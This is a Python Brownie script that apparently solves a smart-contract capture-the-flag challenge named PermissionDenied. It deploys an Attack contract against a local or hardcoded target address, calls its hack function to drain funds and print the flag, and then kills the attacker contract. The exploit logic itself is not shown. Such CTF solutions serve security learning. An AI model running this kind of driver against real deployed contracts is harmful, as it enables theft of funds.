#!/usr/bin/python3
from brownie import PermissionDenied, Attack
from scripts.helpful_scripts import get_account
from scripts.deploy import deploy
from colorama import Fore


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET




def drain_funds(contract_address=None, attacker=None):
    if not contract_address:
        pd, owner = deploy()
        #print(contract_address, owner)
        _, attacker = get_account()
    else:
        pd = PermissionDenied.at("0xa0C3e7033b3421AbB358e0D474f3e5956ef37F14")
    
    #print(pd.address)

    attacking_contract = Attack.deploy(pd.address, {"from": attacker})

    attacking_contract.hack({"from": attacker}).wait(1)

    print(f"{red}Flag: {green}{attacking_contract.data()}{reset}")

    print(f"{red}Killing the contract{reset}")
    
    attacking_contract.kill({"from": attacker}).wait(1)

    


def main(contract_address=None):
    if contract_address:
        drain_funds(contract_address, get_account())
    else:
        drain_funds()

if __name__ == '__main__':
    main()